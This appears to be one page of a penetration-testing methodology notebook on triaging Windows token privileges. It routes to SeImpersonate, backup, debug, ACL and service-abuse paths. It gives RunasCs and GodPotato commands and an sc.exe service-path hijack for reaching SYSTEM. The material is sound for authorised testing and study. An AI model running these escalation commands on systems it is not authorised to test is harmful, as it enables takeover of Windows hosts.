# Windows - Privilege Triage

**Step 28 of 50 · Windows**

*Check enabled token privileges for a direct standalone Windows escalation path.*

## Run this

```powershell
whoami /priv
```

## Example output

```

Privilege Name                  State
=============================  ========
SeImpersonatePrivilege         Enabled
SeAssignPrimaryTokenPrivilege  Disabled
...
```
## What did you get?

- [ ] SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege is enabled → **Go to Step 29 · [[Windows - SeImpersonate Abuse]]**
- [ ] SeBackupPrivilege is enabled → **Follow the Windows backup privilege path**
- [ ] SeDebugPrivilege is enabled → **Follow the Windows process-access path**
- [ ] No useful privilege is enabled → **Check inherited ACLs in Step 28A · [[Windows - Privesc - ACL Misconfiguration]], then continue to Step 31 · [[Windows - Scheduled Task Abuse]] or Step 30 · [[Windows - Service Abuse]]**
- [ ] Valid credentials exist but WinRM and RDP are unavailable → **Use RunasCs for a non-interactive credentialed process: `.\RunasCs.exe $Username2 $Password2 "cmd /c <command>"`**
- [ ] Account is a member of Server Operators → **Use `sc.exe` to temporarily change a LocalSystem service binary path, start it, then immediately restore the original path. Go to Step 30 · [[Windows - Service Abuse]]**

If `SeImpersonatePrivilege` is enabled and the first potato tool does not work, try GodPotato:

```powershell
.\GodPotato.exe -cmd "cmd /c whoami"
```

The command should return `nt authority\\system` before moving to SYSTEM-only collection.

## Notes

Only enabled privileges are immediate candidates.

## Gotcha

> [!warning] 💡
> Listed but disabled privileges are not enough on their own.

## External Resources

- [RunasCs](https://github.com/antonioCoco/RunasCs)
- [GodPotato](https://github.com/BeichenDream/GodPotato)
